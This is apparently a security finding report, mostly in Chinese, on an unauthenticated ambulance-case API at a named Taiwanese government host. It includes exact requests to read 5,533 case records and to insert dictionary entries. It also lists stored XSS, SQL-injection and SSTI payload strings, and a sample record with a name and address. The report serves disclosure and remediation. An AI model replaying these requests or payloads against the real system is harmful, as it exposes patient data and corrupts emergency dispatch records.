# epcr.tpf.gov.tw:4008 EPCRServer 救护车案件 API 无认证 5,533 条 PHI 泄露 + 业务字典可篡改 + Stored XSS 残留

- ID: `817e0cef-ae65-4131-9007-b2ada0eeb4fd`
- Severity: **critical**
- Status: confirmed
- Type: Broken Access Control + Stored XSS + Sensitive Data Exposure + Unrestricted Resource Consumption
- Target: `https://epcr.tpf.gov.tw:4008/EPCRServer (/MciCaseRecords /MciTypes)`
- Conversation: `8979722f-91ff-45c1-8edf-842f14f2d1ab`
- Created: 2026-08-29 20:02:51.323185004+08:00

## Description

epcr.tpf.gov.tw:4008/EPCRServer 的核心案件管理 API /MciCaseRecords 与 /MciTypes 完全无认证访问：
1. GET /MciCaseRecords 一次性披露 5,533 笔救护车案件（含 address/name/MciType/Status/createdAt/updatedAt）
2. GET /MciTypes 披露 24 笔业务字典，且历史测试人员注入 XSS/SQLi 残留（id=1003 `<script>alert(1)</script>`、id=1004/1005/1024/1025 类似痕迹、id=1000001 越界 ID）
3. POST /MciTypes 无认证可插入新字典项（实测 id=1000004 已成功插入"ATTACKER_POC_2026"）
4. 集合级 NOAUTH + 资源级 401 鉴权开启（设计不对称），但集合级接口足以批量篡改

## Preconditions

无需任何认证；目标域名端口 4008（已通过 4000 /config 公开暴露）

## Reproduction

1. 访问 https://epcr.tpf.gov.tw:4000/config 获取 4008 EPCRServer 地址
2. GET https://epcr.tpf.gov.tw:4008/MciCaseRecords 无需认证返回 5,533 笔救护车案件
3. GET https://epcr.tpf.gov.tw:4008/MciTypes 无需认证返回业务字典，含历史 XSS 残留
4. POST https://epcr.tpf.gov.tw:4008/MciTypes Content-Type:application/json Body:{"name":"TEST","MciTypeId":1} → 返回 201 Created
5. 重新 GET /MciTypes 验证新字典项已被持久化

## Evidence

--- retest 2026-08-31 ---
2026-08-31 15:13 CST 本机复测（只读；未再 POST 新字典）：

【入口】
GET :4000/config → mciServer=http://epcr.tpf.gov.tw:4008/client/

【集合级 NOAUTH 读】
- GET /MciCaseRecords → 200 Content-Range items 0-99/5533
  ETag W/"92e0-vxNZmprQEAOCu190zjV+L+MBVSc"（与原报告相同）
  X-XSS-Protection: 1; mode=block（与 4001 的 0 不同）
  字段：id(UUID)/name/address/numberOfAmbulance/isSimulation/createdAt/updatedAt/deletedAt/MciTypeId/StatusId/MciType/Status
  首条含 name+address（真实案件元数据，战情不落完整门牌）
- GET /MciTypes → 200 Content-Range items 0-44/45（原报告 24 条，今日 45——持续被写入）

【历史污染仍在库】
- 1003  name=<script>alert(1)</script>
- 1004  ';DROP TABLE MciTypes--
- 1005  ' OR 1=1--
- 1024  SSTI {{constructor.constructor("alert(1)")()}}
- 1025  test' OR 1=1 --
- 1000001 TestForcedId（越界 ID）
- 1000004 ATTACKER_POC_2026（原 POC 仍在）
- 另有 1000018–1000045 后续 pentest/XSS/CSRF 残留（含 2026-08-31 06:23 的 script+fetch）

【资源级 vs 集合级】
GET /MciTypes/1003、/1000004、/1000001、/MciCaseRecords/{uuid} → 一律 401 No authorization token was found
OPTIONS 两集合 → 204 Allow GET,HEAD,PUT,PATCH,POST,DELETE

【未做】
未再 POST 新 MciTypes，避免继续污染派遣字典。写入能力以既有 201 记录与今日 45 条残留为证。

1. GET /MciCaseRecords 无认证 5,533 条:
```
GET https://epcr.tpf.gov.tw:4008/MciCaseRecords HTTP/1.1
→ HTTP/1.1 200 OK
  Content-Range: items 0-99/5533
  Content-Length: 37600
  ETag: W/"92e0-vxNZmprQEAOCu190zjV+L+MBVSc"
  x-xss-protection: 1; mode=block

典型记录样例：
{"id":"0009628d-ec30-4786-ace3-dccd80e935f6","name":"測試 大傷",
 "address":"中興北街225號","numberOfAmbulance":0,"isSimulation":false,
 "createdAt":"2025-06-28T07:09:19.000Z","updatedAt":"2025-06-28T07:09:19.000Z",
 "MciTypeId":2,"StatusId":2,
 "MciType":{"id":2,"name":"車禍"},
 "Status":{"id":2,"name":"結束"}}
```

2. /MciTypes 历史攻击痕迹:
GET https://epcr.tpf.gov.tw:4008/MciTypes → 包含
  - id=1003 name="<script>alert(1)</script>" (Stored XSS)
  - id=1000001 (大幅越界 ID 仍能取回)
  - id=1024/1025 类似 SQLi 探测残留

3. POST /MciTypes 无认证写入:
```
POST https://epcr.tpf.gov.tw:4008/MciTypes HTTP/1.1
Content-Type: application/json
{"name":"ATTACKER_POC_2026","MciTypeId":999}

→ HTTP/1.1 201 Created
  Location: /MciTypes/1000004
  返回 {"id":1000004,"name":"ATTACKER_POC_2026",...}
```

## Impact

**CRITICAL**：
- 5,533 笔救护车案件 + 24 条业务字典无授权完整披露（含 PHI 地址/时间/MciType）
- 业务字典被污染将影响救护派遣决策（错误的事件类型分派）
- 已有 Stored XSS 残留 id=1003，admin 查看时触发任意 JS 执行
- 攻击者可批量爬取 5,533 条 + 持续写入恶意字典项，实现持久化驻留

## Recommendation

1. /MciCaseRecords 与 /MciTypes 集合级 GET/POST 全部加 express-jwt 中间件
2. /MciTypes 资源级与集合级 API 鉴权必须一致（当前资源级 401 vs 集合级 NOAUTH = 设计缺陷）
3. name 字段落库前用 sanitize-html / escape-html 转义
4. 立即清除历史攻击痕迹 id=1003/1004/1005/1024/1025/1000001 与本次新增 1000004
5. 启用 AccessLog 监控大批量 GET/POST /MciTypes 请求
